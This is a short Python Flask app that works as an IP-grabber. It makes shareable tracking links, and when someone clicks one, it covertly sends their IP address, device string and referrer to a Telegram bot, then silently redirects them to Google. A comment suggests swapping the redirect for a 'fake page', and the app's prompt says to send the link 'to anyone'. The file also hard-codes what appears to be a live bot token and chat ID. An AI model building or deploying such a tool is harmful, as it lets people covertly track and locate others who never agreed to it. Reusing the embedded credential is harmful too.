from flask import Flask, request, redirect
import requests
import uuid
from datetime import datetime

app = Flask(__name__)

TOKEN = "8623908851:AAEa5zbK22wfIj2IezRFjz9CsrnNN02ab3Q"
CHAT_ID = 7591700804   # ← Already filled for you

@app.route('/track/<link_id>')
def track(link_id):
    # Get visitor info
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = f"""🔥 New Click Detected!

🆔 Link ID: {link_id}
⏰ Time: {timestamp}
🌐 IP: {ip}
📱 Device: {user_agent}
🔗 Referrer: {referrer or 'Direct'}"""

    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
        )
    except:
        pass

    # Change this to any website you want (fake page or real redirect)
    return redirect("https://google.com", code=302)

@app.route('/generate')
def generate():
    link_id = str(uuid.uuid4())[:12]
    full_link = f"https://web-production-39eb45.up.railway.app/track/{link_id}"
    return f"✅ Your new tracking link:\n\n{full_link}\n\nSend this to anyone!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
